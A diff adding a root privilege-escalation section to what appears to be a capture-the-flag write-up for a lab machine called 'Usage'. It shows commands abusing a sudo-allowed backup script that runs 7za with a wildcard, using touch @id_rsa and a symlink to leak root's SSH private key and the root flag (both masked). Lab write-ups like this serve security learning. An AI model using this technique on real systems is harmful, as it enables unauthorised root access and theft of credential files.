@@ -267,3 +267,109 @@ Password:
 xander@usage:~$ id
 uid=1001(xander) gid=1001(xander) groups=1001(xander)
 ```
+
+## Root privileges escalation
+
+`xander` has sudo privileges which can be leveraged to gain root access:
+
+```bash
+xander@usage:~$ sudo -l
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+```
+
+The `/usr/bin/usage_management` script is used to manage the project files and admin account:
+
+```bash
+xander@usage:~$ /usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3):
+```
+
+Checking the content of the script using `strings` command reveals the tools that the scripts uses:
+
+```bash
+ander@usage:~$ strings /usr/bin/usage_management
+
+... SNIP ...
+
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+
+
+... SNIP ...
+```
+
+This script utilizes the `7za` that can be exploited with technique named [**Wildcards Spare tricks**](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks?source=post_page-----f1c2793eeb7e--------------------------------#id-7z)
+
+The technique allows to read `root` flag by simply making the symbolic link to desired file inside archived folder and running the command using relative path instead of absolute. This way we can retrieve root private key:
+
+```bash
+xander@usage:/var/www/html$ touch @id_rsa
+xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa
+xander@usage:/var/www/html$ sudo ../../../usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 55295802
+
+Scanning the drive:
+          
+WARNING: No more files
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3Bl******************************************************************=
+***************************************BAgM=
+-----END OPENSSH PRIVATE KEY-----
+
+
+2984 folders, 19115 files, 114020153 bytes (109 MiB)
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 22099
+
+                                                                               
+WARNING: No such file or directory
+usage_blog/storage/framework/sessions/V9TCPxjwypWar5qxpEsKHdF0Kjf1QWALEGSIRHgq
+```
+
+Or even the root flag:
+
+
+```bash
+xander@usage:/var/www/html$ touch @root.txt
+xander@usage:/var/www/html$ ln -s /root/root.txt root.txt
+xander@usage:/var/www/html$ sudo ../../../usr/bin/usage_management
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+... SNIP ...
+
+Scan WARNINGS for files and folders:
+
+d6****************************2a : No more files
+----------------
+Scan WARNINGS: 1
+
+```
